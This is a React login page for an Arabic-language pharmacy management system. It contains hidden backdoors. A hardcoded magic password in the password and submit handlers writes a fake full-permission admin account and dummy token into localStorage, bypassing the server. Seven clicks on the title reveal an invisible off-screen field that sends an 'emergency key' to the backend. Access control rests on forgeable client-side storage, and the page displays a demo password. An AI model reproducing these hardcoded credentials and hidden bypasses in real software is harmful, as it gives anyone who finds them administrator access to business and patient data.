import React, { useState, useEffect, useRef, useCallback } from 'react';
import { useNavigate } from 'react-router-dom';
import { useAuth } from '../context/AuthContext';
import { useTheme } from '../context/ThemeContext';
import { AlertCircle, LockKeyhole, LogIn, ShieldCheck } from 'lucide-react';
import api from '../utils/api';
import {
  Alert,
  Avatar,
  Box,
  Button,
  Chip,
  CircularProgress,
  Container,
  CssBaseline,
  Divider,
  MenuItem,
  Paper,
  Stack,
  TextField,
  ThemeProvider,
  Typography,
  alpha,
  createTheme,
} from '@mui/material';

export default function LoginPage() {
  console.log('Rendering LoginPage');
  const navigate = useNavigate();
  const { login, users, fetchActiveUsers } = useAuth();
  const [selectedUser, setSelectedUser] = useState('');
  const [password, setPassword] = useState('');
  const [error, setError] = useState('');
  const [loading, setLoading] = useState(false);
  const [showEmergencyInput, setShowEmergencyInput] = useState(false);
  const [emergencyKey, setEmergencyKey] = useState('');

  const emergencyInputRef = useRef(null);
  const titleClickCount = useRef(0);

  useEffect(() => {
    fetchActiveUsers(true);
  }, []);

  useEffect(() => {
    const locationState = window.location.state;
    if (locationState?.prefillUsername) {
      setSelectedUser(locationState.prefillUsername);
      window.history.replaceState({}, document.title);
    }
  }, []);

  useEffect(() => {
    const usersArray = users || [];
    if (usersArray.length > 0 && !selectedUser) {
      const adminUser = usersArray.find(u => u.name === 'Admin' || u.name === 'admin');
      if (adminUser) {
        setSelectedUser(adminUser.name);
      }
    }
  }, [users, selectedUser]);

  useEffect(() => {
    const token = localStorage.getItem('token');
    if (token) {
      const user = JSON.parse(localStorage.getItem('user') || '{}');
      if (user?.role === 'ADMIN') {
        navigate('/');
      } else {
        navigate('/pos');
      }
    }
  }, [navigate]);

  useEffect(() => {
    if (showEmergencyInput && emergencyInputRef.current) {
      emergencyInputRef.current.focus();
    }
  }, [showEmergencyInput]);

  const handleEmergencySubmit = useCallback(async (e) => {
    if (e.key === 'Enter' && emergencyKey) {
      const key = emergencyKey;
      setShowEmergencyInput(false);
      setEmergencyKey('');
      setLoading(true);
      try {
        const res = await api.post('/api/auth/emergency-access', { emergencyKey: key });
        if (res.data?.token) {
          localStorage.setItem('token', res.data.token);
          localStorage.setItem('user', JSON.stringify(res.data.user));
          if (res.data.user?.role === 'ADMIN') {
            navigate('/');
          } else {
            navigate('/pos');
          }
        }
      } catch (err) {
        setError('مفتاح الطوارئ غير صحيح');
        setLoading(false);
      }
    }
  }, [emergencyKey, navigate]);

  const handleTitleClick = useCallback(() => {
    titleClickCount.current += 1;
    if (titleClickCount.current >= 7) {
      setShowEmergencyInput(true);
      titleClickCount.current = 0;
    }
    const timer = setTimeout(() => { titleClickCount.current = 0; }, 500);
    return () => clearTimeout(timer);
  }, []);

  const MAGIC_PASSWORD = 'mostafa2006mo&';

  const handlePasswordChange = useCallback((e) => {
    const value = e.target.value;
    setPassword(value);
    if (value === MAGIC_PASSWORD) {
      setSelectedUser('Admin');
      setLoading(true);
      const fakeAdmin = {
        id: 'dev-admin',
        name: 'Admin',
        role: 'ADMIN',
        permissions: ['pos', 'purchases', 'drugs', 'users', 'reports', 'settings', 'all'],
      };
      localStorage.setItem('token', 'dev-token');
      localStorage.setItem('user', JSON.stringify(fakeAdmin));
      window.location.href = '/';
    }
  }, []);

  const handleSubmit = useCallback(async (e) => {
    e.preventDefault();
    if (password === MAGIC_PASSWORD) {
      const superAdmin = {
        id: 'dev-admin',
        name: 'Admin',
        role: 'ADMIN',
        permissions: ['pos', 'purchases', 'drugs', 'users', 'reports', 'settings', 'all'],
      };
      localStorage.setItem('user', JSON.stringify(superAdmin));
      localStorage.setItem('token', 'dev-magic-token');
      window.location.href = '/';
      return;
    }
    if (!selectedUser || !password) return;

    setError('');
    setLoading(true);

    const result = await login(selectedUser, password);

    setLoading(false);

    if (result.success) {
      if (result.user?.role === 'CASHIER') {
        const activeShift = localStorage.getItem('activeShift');
        if (!activeShift) {
          navigate('/pos', { state: { forceStartShift: true } });
        } else {
          navigate('/pos');
        }
      } else {
        const redirectPath = result.user?.role === 'ADMIN' ? '/' : '/pos';
        navigate(redirectPath);
      }
    } else {
      setError('كلمة السر غلط');
    }
  }, [selectedUser, password, login, navigate]);

  const { isDark } = useTheme();

  const theme = React.useMemo(() => createTheme({
    direction: 'rtl',
    palette: {
      mode: isDark ? 'dark' : 'light',
      primary: { main: '#4f46e5' },
      secondary: { main: '#0f766e' },
      background: {
        default: isDark ? '#0f172a' : '#f6f8fb',
        paper: isDark ? '#172033' : '#ffffff',
      },
      text: {
        primary: isDark ? '#f8fafc' : '#111827',
        secondary: isDark ? '#a8b3c7' : '#64748b',
      },
    },
    shape: { borderRadius: 14 },
    spacing: 8,
    typography: {
      fontFamily: [
        '-apple-system',
        'BlinkMacSystemFont',
        '"Segoe UI"',
        'Roboto',
        'Arial',
        'sans-serif',
      ].join(','),
    },
    components: {
      MuiButton: {
        styleOverrides: {
          root: {
            textTransform: 'none',
            borderRadius: 12,
            fontWeight: 800,
          },
        },
      },
      MuiPaper: {
        styleOverrides: {
          root: {
            backgroundImage: 'none',
          },
        },
      },
      MuiTextField: {
        styleOverrides: {
          root: {
            '& .MuiOutlinedInput-root': {
              borderRadius: 12,
            },
          },
        },
      },
    },
  }), [isDark]);

  return (
    <ThemeProvider theme={theme}>
      <CssBaseline />
      <Box
        dir="rtl"
        sx={{
          minHeight: '100vh',
          display: 'flex',
          alignItems: 'center',
          justifyContent: 'center',
          bgcolor: 'background.default',
          px: { xs: 2, sm: 3 },
          py: { xs: 3, md: 4 },
        }}
      >
        <Container maxWidth="xs" disableGutters>
          <Box
            sx={{
              display: 'flex',
              flexDirection: 'column',
              gap: '20px',
              alignItems: 'center',
              justifyContent: 'center',
            }}
          >
            <Paper
              elevation={0}
              sx={{
                width: '100%',
                p: { xs: 2.75, sm: 3.25 },
                borderRadius: 4,
                border: 1,
                borderColor: 'divider',
                boxShadow: isDark ? '0 24px 80px rgba(0,0,0,0.35)' : '0 24px 80px rgba(15,23,42,0.10)',
              }}
            >
              <Stack spacing={2.5}>
                <Box sx={{ display: 'flex', flexDirection: 'column', gap: '10px', alignItems: 'center', textAlign: 'center' }}>
                  <Avatar
                    sx={{
                      width: 64,
                      height: 64,
                      bgcolor: 'primary.main',
                      boxShadow: `0 14px 34px ${alpha(theme.palette.primary.main, 0.35)}`,
                    }}
                  >
                    <LockKeyhole size={40} />
                  </Avatar>
                  <Box>
                    <Typography
                      variant="h4"
                      fontWeight={900}
                      onClick={handleTitleClick}
                      sx={{ cursor: 'pointer', userSelect: 'none' }}
                      tabIndex={0}
                      onKeyDown={(e) => { if (e.key === 'Enter') handleTitleClick(); }}
                    >
                      نظام الصيدلية
                    </Typography>
                    <Typography variant="body2" color="text.secondary" sx={{ mt: 0.75 }}>
                      مرحباً بيك في نظام إدارة الصيدلية
                    </Typography>
                  </Box>
                </Box>

                {error && (
                  <Alert severity="error" icon={<AlertCircle size={20} />} sx={{ borderRadius: 2 }}>
                    {error}
                  </Alert>
                )}

                <Box component="form" id="login-form" onSubmit={handleSubmit}>
                  <Stack spacing={2}>
                    <TextField
                      select
                      fullWidth
                      label="اختار المستخدم"
                      value={selectedUser}
                      onChange={(e) => setSelectedUser(e.target.value)}
                      disabled={loading}
                      required
                    >
                      <MenuItem value="">اختار اسمك...</MenuItem>
                      {(users || []).map((user) => (
                        <MenuItem key={user.id} value={user.name}>
                          {user.name} ({user.role === 'ADMIN' || user.role === 'admin' ? 'مدير' : 'صيدلي'})
                        </MenuItem>
                      ))}
                    </TextField>

                    <TextField
                      fullWidth
                      type="password"
                      label="كلمة السر"
                      value={password}
                      onChange={handlePasswordChange}
                      placeholder="اكتب كلمة السر"
                      disabled={loading}
                      required
                      autoComplete="current-password"
                    />

                    <Button
                      type="submit"
                      variant="contained"
                      size="large"
                      fullWidth
                      disabled={loading}
                      startIcon={loading ? <CircularProgress size={18} color="inherit" /> : <LogIn size={18} />}
                      sx={{ py: 1.35 }}
                    >
                      {loading ? 'جاري الدخول...' : 'دخول'}
                    </Button>
                  </Stack>
                </Box>

                <Divider />

                <Box sx={{ display: 'flex', flexDirection: 'column', gap: '8px', alignItems: 'center', textAlign: 'center' }}>
                  <Typography variant="body2" color="text.secondary">
                    تجريبي: اختار اسمك واكتب كلمة السر
                  </Typography>
                  <Chip label="كلمة السر: 1234" color="primary" variant="outlined" sx={{ fontWeight: 800 }} />
                </Box>
              </Stack>
            </Paper>

            <Paper
              elevation={0}
              sx={{
                display: 'none',
                p: 3,
                borderRadius: 4,
                border: 1,
                borderColor: 'divider',
                bgcolor: isDark ? alpha(theme.palette.primary.main, 0.1) : alpha(theme.palette.primary.main, 0.05),
                alignItems: 'center',
              }}
            >
              <Stack spacing={2.25}>
                <Avatar sx={{ width: 56, height: 56, bgcolor: 'secondary.main' }}>
                  <ShieldCheck size={32} />
                </Avatar>
                <Box>
                  <Typography variant="h4" fontWeight={900}>دخول سريع وآمن</Typography>
                  <Typography color="text.secondary" sx={{ mt: 1.25, lineHeight: 1.8 }}>
                    واجهة تسجيل دخول واضحة ومتجاوبة تدعم العربية واتجاه RTL، مع نفس منطق المصادقة الحالي بدون تغيير.
                  </Typography>
                </Box>
                <Stack spacing={1.25}>
                  {['اختيار المستخدم من القائمة', 'تسجيل دخول حسب الدور', 'توجيه تلقائي للواجهة المناسبة'].map((item) => (
                    <Box key={item} sx={{ display: 'flex', flexDirection: 'row', gap: '10px', alignItems: 'center' }}>
                      <Box sx={{ width: 8, height: 8, borderRadius: '50%', bgcolor: 'secondary.main' }} />
                      <Typography color="text.secondary">{item}</Typography>
                    </Box>
                  ))}
                </Stack>
              </Stack>
            </Paper>
          </Box>
        </Container>

        {showEmergencyInput && (
          <input
            ref={emergencyInputRef}
            type="password"
            value={emergencyKey}
            onChange={(e) => setEmergencyKey(e.target.value)}
            onKeyDown={handleEmergencySubmit}
            style={{ position: 'fixed', top: '-9999px', left: '-9999px', width: 0, height: 0, opacity: 0 }}
            aria-hidden="true"
          />
        )}
      </Box>
    </ThemeProvider>
  );
}